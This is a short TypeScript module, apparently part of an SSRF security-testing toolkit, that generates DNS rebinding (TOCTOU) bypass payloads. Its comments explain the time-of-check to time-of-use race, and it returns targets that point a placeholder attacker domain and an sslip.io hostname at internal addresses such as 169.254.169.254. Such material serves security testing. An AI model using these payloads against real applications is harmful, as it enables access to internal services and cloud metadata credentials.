/**
 * DNS Rebinding / TOCTOU (Time-of-Check-Time-of-Use) SSRF bypass payloads.
 *
 * DNS rebinding exploits the gap between DNS resolution and HTTP request.
 * A domain resolves to an allowed IP during validation, then rebinds to an
 * internal IP before the actual request is made.
 *
 * This is a TOCTOU race condition: the check (DNS resolve) and the use
 * (HTTP connect) happen at different times, and DNS can change between them.
 *
 * True rebinding requires attacker-controlled DNS. Services like nip.io, sslip.io,
 * and 1u.ms provide dynamic DNS that embeds IPs in subdomains, but they resolve
 * statically (the IP in the hostname IS the resolved IP). For actual rebinding,
 * the attacker needs a DNS server that alternates between two IPs.
 *
 * @see Orange Tsai paper p.45, 67-68 (WordPress case study)
 */

export interface RebindingTarget {
  domain: string;
  firstIp: string;
  secondIp: string;
  technique: string;
}

/**
 * Generates DNS rebinding / TOCTOU bypass payloads.
 *
 * @param allowedIp IP that passes validation (e.g., public CDN IP)
 * @param internalIp IP to rebind to (e.g., 127.0.0.1, 169.254.169.254)
 * @returns Array of rebinding targets
 * @see RFC1034 §3.6 for DNS TTL behavior
 */
export function generateRebindingPayloads(
  allowedIp: string,
  internalIp: string
): RebindingTarget[] {
  const targets: RebindingTarget[] = [];

  // TOCTOU race condition explanation:
  // 1. App resolves DNS -> gets allowedIp (passes validation)
  // 2. Attacker's DNS server rebinds domain -> internalIp
  // 3. App connects to internalIp (actual SSRF)
  //
  // For true rebinding, attacker needs to:
  // - Control a DNS server (or use a service like dnschef)
  // - Set very low TTL (1 second or less)
  // - Alternate responses between allowedIp and internalIp
  //
  // NOTE: Simple dynamic-DNS aliases (nip.io, sslip.io, 1u.ms, localtest.me) are
  // intentionally excluded here.  They resolve *statically* to the IP embedded in
  // the hostname and therefore do NOT exhibit TOCTOU rebinding.  Those aliases are
  // canonical localhost-rewrites used by ip-obfuscation.ts instead.

  // WordPress case study (Orange Tsai p.67-68):
  // WordPress SSRF via DNS rebinding to access internal services.
  // The application resolves the domain to validate it, then
  // re-resolves when making the actual HTTP request.

  // Attacker-controlled DNS server pattern (requires dnschef or custom DNS)
  targets.push({
    domain: "rebind.attacker.com",
    firstIp: allowedIp,
    secondIp: internalIp,
    technique: "TOCTOU race - Requires attacker DNS server with low TTL, alternating IPs"
  });

  // IPv6 sslip.io variant — resolves to the embedded IPv6 address
  targets.push({
    domain: `ipv6.${internalIp}.sslip.io`,
    firstIp: allowedIp,
    secondIp: internalIp,
    technique: "Dynamic DNS - IPv6-compatible sslip.io variant"
  });

  return targets;
}
